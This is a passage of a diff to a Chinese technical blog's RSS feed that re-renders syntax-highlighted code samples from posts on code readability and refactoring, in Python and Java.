-        rule_list = rules[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;rules&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#228b22&#34;&gt;# 2&lt;/span&gt;
-        res = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;None&lt;/span&gt;
-
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#658b00&#34;&gt;str&lt;/span&gt;(rule_type).lower() != RULES_MAPPING:
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ValueError&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;type of rule should be &amp;#39;rules_mapping&amp;#39;&amp;#34;&lt;/span&gt;)
-
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt; rule &lt;span style=&#34;color:#8b008b&#34;&gt;in&lt;/span&gt; rule_list:
-            col_name = rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;column&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#228b22&#34;&gt;# 2&lt;/span&gt;
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;function&amp;#39;&lt;/span&gt;].lower() == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;cast&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#228b22&#34;&gt;# 3&lt;/span&gt;
-                mapping_dict, other = self.parse_cast(rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mapping&amp;#39;&lt;/span&gt;])
-                res = data[col_name].apply(self.case_func, args=(mapping_dict, other))
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;elif&lt;/span&gt; rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;function&amp;#39;&lt;/span&gt;].lower() == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;in&amp;#39;&lt;/span&gt;:
-                mapping_dict, other = self.parse_in(rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mapping&amp;#39;&lt;/span&gt;])
-                res = data[col_name].apply(self.in_func, args=(mapping_dict, other))
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;elif&lt;/span&gt; rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;function&amp;#39;&lt;/span&gt;].lower() == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;binning&amp;#39;&lt;/span&gt;:
-                res = data[col_name].apply(self.binning_func, args=(rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mapping&amp;#39;&lt;/span&gt;]))
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt;:
-                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ValueError&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;not supported function&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#228b22&#34;&gt;# 4 &lt;/span&gt;
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; res
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;代化之后的代码：&lt;/p&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;handle&lt;/span&gt;(self, data, rules):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        rule_type = rules[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#228b22&#34;&gt;# 1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        rule_list = rules[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;rules&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#228b22&#34;&gt;# 2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        res = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;None&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#658b00&#34;&gt;str&lt;/span&gt;(rule_type).lower() != RULES_MAPPING:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ValueError&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;type of rule should be &amp;#39;rules_mapping&amp;#39;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt; rule &lt;span style=&#34;color:#8b008b&#34;&gt;in&lt;/span&gt; rule_list:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            col_name = rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;column&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#228b22&#34;&gt;# 2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;function&amp;#39;&lt;/span&gt;].lower() == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;cast&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#228b22&#34;&gt;# 3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                mapping_dict, other = self.parse_cast(rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mapping&amp;#39;&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                res = data[col_name].apply(self.case_func, args=(mapping_dict, other))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;elif&lt;/span&gt; rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;function&amp;#39;&lt;/span&gt;].lower() == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;in&amp;#39;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                mapping_dict, other = self.parse_in(rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mapping&amp;#39;&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                res = data[col_name].apply(self.in_func, args=(mapping_dict, other))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;elif&lt;/span&gt; rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;function&amp;#39;&lt;/span&gt;].lower() == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;binning&amp;#39;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                res = data[col_name].apply(self.binning_func, args=(rule[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mapping&amp;#39;&lt;/span&gt;]))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ValueError&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;not supported function&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#228b22&#34;&gt;# 4 &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; res
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;代化之后的代码：&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -635,28 +650,28 @@ CLUSTER_WORKER_THREAD_NUM = DASK_PROPERTIES_DICT[&lt;span style=&#34;color:#cd55
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;下面代码都来源于部门某一中间件产品(java)的源码，代码风格（此风格非格式风格而是逻辑思维风格）并且在整个源码中具有普遍性。&lt;/p&gt;
 &lt;p&gt;代码一：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;run&lt;/span&gt;() {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt;(!(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;stopped&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;())) {
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;synchronized&lt;/span&gt; (&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;lock&lt;/span&gt;) {
-                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;endTime&lt;/span&gt; - System.&lt;span style=&#34;color:#658b00&#34;&gt;currentTimeMills&lt;/span&gt;() &amp;gt; 0L) {
-                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
-                        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;stopped&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;()) {
-                            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt;;
-                        }
-                        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;lock&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;wait&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;endTime&lt;/span&gt; - System.&lt;span style=&#34;color:#658b00&#34;&gt;currentTimeMillis&lt;/span&gt;());
-                        &lt;span style=&#34;color:#228b22&#34;&gt;// 省略主要业务逻辑
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;                    } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt; (IntrruptedExecption e) {
-                        &lt;span style=&#34;color:#228b22&#34;&gt;// 省略日志打印
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;                    }
-                } &lt;span style=&#34;color:#228b22&#34;&gt;// 注意：这个while之后并没有其它的逻辑
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            }
-        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt;(Throwable e) {
-            &lt;span style=&#34;color:#228b22&#34;&gt;// 省略日志打印
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        }
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;代码意思是可能在等待的最大时间内，中间可以被通知执行主逻辑，然后再进入等待下次通知。在易读性上的问题：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;run&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt;(!(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;stopped&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;())) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;synchronized&lt;/span&gt; (&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;lock&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;endTime&lt;/span&gt; - System.&lt;span style=&#34;color:#658b00&#34;&gt;currentTimeMills&lt;/span&gt;() &amp;gt; 0L) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;stopped&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;()) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;lock&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;wait&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;endTime&lt;/span&gt; - System.&lt;span style=&#34;color:#658b00&#34;&gt;currentTimeMillis&lt;/span&gt;());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#228b22&#34;&gt;// 省略主要业务逻辑
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;                    } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt; (IntrruptedExecption e) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#228b22&#34;&gt;// 省略日志打印
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;                    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                } &lt;span style=&#34;color:#228b22&#34;&gt;// 注意：这个while之后并没有其它的逻辑
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt;(Throwable e) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#228b22&#34;&gt;// 省略日志打印
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;代码意思是可能在等待的最大时间内，中间可以被通知执行主逻辑，然后再进入等待下次通知。在易读性上的问题：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;双重while， 双重try/catch，增加代码嵌套层次，代码有六层，由于跨度较大，掩盖了要表达的业务逻辑，不容易看懂。&lt;/li&gt;
 &lt;li&gt;第一个while判断是 &lt;code&gt;否定之否定&lt;/code&gt; 判断，不够直接，stoppped不需采AtomicBoolean，使用volatile变量即可。&lt;/li&gt;
@@ -677,28 +692,28 @@ CLUSTER_WORKER_THREAD_NUM = DASK_PROPERTIES_DICT[&lt;span style=&#34;color:#cd55
       <guid>http://lanlingzi.cn/post/technical/2020/0808_code/</guid>
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;最近在走读某一老产品的代码，发现存在一个普遍不好的实践，代码类似如下：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Class1&lt;/span&gt; {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; Map&amp;lt;String, String&amp;gt; store = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;&amp;gt;();
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; List&amp;lt;Class2&amp;gt; queue = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;();
-    &lt;span style=&#34;color:#228b22&#34;&gt;//... 省略其它的字段与其Getter/Setter方法
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此类的特点是：只有一些集合字段与其Getter/Setter，而对字段的使用却是如下：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;method1&lt;/span&gt;() {
-  &lt;span style=&#34;color:#228b22&#34;&gt;// ... 省略其它逻辑
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
-   &lt;span style=&#34;color:#228b22&#34;&gt;// 在其它的类中的方法实现中，却通过Getter方法获取集合对象加锁来处理
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;   &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;synchronized&lt;/span&gt;(class1.&lt;span style=&#34;color:#658b00&#34;&gt;getStore&lt;/span&gt;()) {
-     String value = class1.&lt;span style=&#34;color:#658b00&#34;&gt;getStore&lt;/span&gt;().&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(key);
-     &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (value == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;) {
-        &lt;span style=&#34;color:#228b22&#34;&gt;// ... 省略其它逻辑
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        value = createValue();
-        class1.&lt;span style=&#34;color:#658b00&#34;&gt;getStore&lt;/span&gt;().&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(key, value);
-     }
-   }
-
-   &lt;span style=&#34;color:#228b22&#34;&gt;// ... 省略其它逻辑
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;代码的问题是很明显：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Class1&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; Map&amp;lt;String, String&amp;gt; store = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;&amp;gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; List&amp;lt;Class2&amp;gt; queue = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;//... 省略其它的字段与其Getter/Setter方法
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此类的特点是：只有一些集合字段与其Getter/Setter，而对字段的使用却是如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;method1&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#228b22&#34;&gt;// ... 省略其它逻辑
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#228b22&#34;&gt;// 在其它的类中的方法实现中，却通过Getter方法获取集合对象加锁来处理
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;   &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;synchronized&lt;/span&gt;(class1.&lt;span style=&#34;color:#658b00&#34;&gt;getStore&lt;/span&gt;()) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     String value = class1.&lt;span style=&#34;color:#658b00&#34;&gt;getStore&lt;/span&gt;().&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(key);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (value == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// ... 省略其它逻辑
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        value = createValue();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        class1.&lt;span style=&#34;color:#658b00&#34;&gt;getStore&lt;/span&gt;().&lt;span style=&#34;color:#658b00&#34;&gt;put&lt;/span&gt;(key, value);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
